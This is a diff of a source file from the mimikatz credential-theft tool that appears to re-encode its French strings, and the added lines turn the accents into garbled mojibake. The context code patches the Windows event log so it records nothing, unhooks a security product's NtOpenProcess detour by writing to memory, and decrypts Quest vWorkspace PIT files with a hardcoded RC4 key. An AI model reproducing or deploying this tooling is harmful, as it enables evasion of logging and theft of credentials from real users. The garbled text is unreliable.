@@ -1,4 +1,4 @@
-/*	Benjamin DELPY `gentilkiwi`
+Ôªø/*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
@@ -9,11 +9,11 @@ vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_divers::getMimiKatzComma
 {
 	vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> monVector;
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(noroutemon,	L"noroutemon",	L"[experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch l\'observateur d\'ÈvÈnements pour ne plus rien enregistrer"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch le bouton annuler de Windows XP et 2003 en console pour dÈverrouiller une session"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(eventdrop,	L"eventdrop",	L"[super experimental] Patch l\'observateur d\'Èñ¢Èñöements pour ne plus rien enregistrer"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(cancelator,	L"cancelator",	L"Patch le bouton annuler de Windows XP et 2003 en console pour dÈñ¢errouiller une session"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(secrets,		L"secrets",		L"Affiche les secrets utilisateur"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-dÈtours SR"));
-	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"DÈchiffre les fichiers PIT (Quest vWorkspace Client)"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(nodetour,	L":nodetour",	L"Anti-dÈñ†ours SR"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(pitme,		L":pitme",		L"DÈñèhiffre les fichiers PIT (Quest vWorkspace Client)"));
 	return monVector;
 }
 
@@ -34,15 +34,15 @@ bool mod_mimikatz_divers::nodetour(vector<wstring> * arguments)
 		PBYTE monNTDLLptr = reinterpret_cast<PBYTE>(GetProcAddress(GetModuleHandle(L"ntdll"), "NtOpenProcess"));
 		if(memcmp(monNTDLLptr + 8, monDetouredStub, sizeof(monDetouredStub)) == 0)
 		{
-			(*outputStream) << L"DÈtour trouvÈ et ";
+			(*outputStream) << L"DÈñ†our trouv?et ";
 			if(mod_memory::writeMemory(monNTDLLptr + 8 + sizeof(monDetouredStub) + sizeof(LONG) + *reinterpret_cast<PLONG>(monNTDLLptr + 8 + sizeof(monDetouredStub)), monSysEnterRetn, sizeof(monSysEnterRetn)))
-				(*outputStream) << L"patchÈ :)";
+				(*outputStream) << L"patch?:)";
 			else
-				(*outputStream) << L"NON patchÈ :(";
+				(*outputStream) << L"NON patch?:(";
 			(*outputStream) << endl;
 		}
 		else
-			(*outputStream) << L"DÈtour non trouvÈ" << endl;
+			(*outputStream) << L"DÈñ†our non trouv? "<< endl;
 	}
 	return true;
 }
@@ -269,13 +269,13 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 			fread(monBuffer, tailleFichierSource, 1, monFichierSource);
 			fclose(monFichierSource);
 
-			(*outputStream) << L"OK" << endl << L" * DÈchiffrement n∞1 : ";
+			(*outputStream) << L"OK" << endl << L" * DÈñèhiffrement n? : ";
 			if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource, HARDCODED_KEY, sizeof(HARDCODED_KEY), CALG_RC4))
 			{
-				(*outputStream) << L"OK" << endl << L" * DÈchiffrement n∞2 : ";
+				(*outputStream) << L"OK" << endl << L" * DÈñèhiffrement n? : ";
 				if(mod_crypto::genericDecrypt(monBuffer, tailleFichierSource - SUBKEY_SIZE, monBuffer + tailleFichierSource - SUBKEY_SIZE, SUBKEY_SIZE, CALG_RC4))
 				{
-					(*outputStream) << L"OK" << endl << L" * En-tÍte : ";
+					(*outputStream) << L"OK" << endl << L" * En-tÈòæe : ";
 					if(memcmp(monBuffer, HEADER_PIT, sizeof(HEADER_PIT)) == 0)
 					{
 						(*outputStream) << L"OK" << endl;
@@ -284,7 +284,7 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 
 						if(arguments->size() > 1)
 						{
-							(*outputStream) << L" * Ouverture en Ècriture du fichier \'" << arguments->back() << L"\' : ";
+							(*outputStream) << L" * Ouverture en Èñèriture du fichier \'" << arguments->back() << L"\' : ";
 							error = _wfopen_s(&monFichierDestination, arguments->back().c_str(), L"wb");
 							if(error == 0)
 							{
@@ -294,9 +294,9 @@ bool mod_mimikatz_divers::pitme(vector<wstring> * arguments)
 							}
 							else (*outputStream) << L"KO" << endl;
 						}
-						else (*outputStream) << L" * DonnÈes : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
+						else (*outputStream) << L" * DonnÈñës : " << endl << endl << wstring(reinterpret_cast<char *>(monBufferData), reinterpret_cast<char *>(monBufferData + tailleData)) << endl;
 					}
-					else (*outputStream) << L"KO - diffÈrent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
+					else (*outputStream) << L"KO - diffÈñûent de \'PIT\' ; " << mod_text::stringOfHex(HEADER_PIT, sizeof(HEADER_PIT)) << L" != " << mod_text::stringOfHex(monBuffer, sizeof(HEADER_PIT)) << endl;
 				}
 				else (*outputStream) << L"KO";
 			}
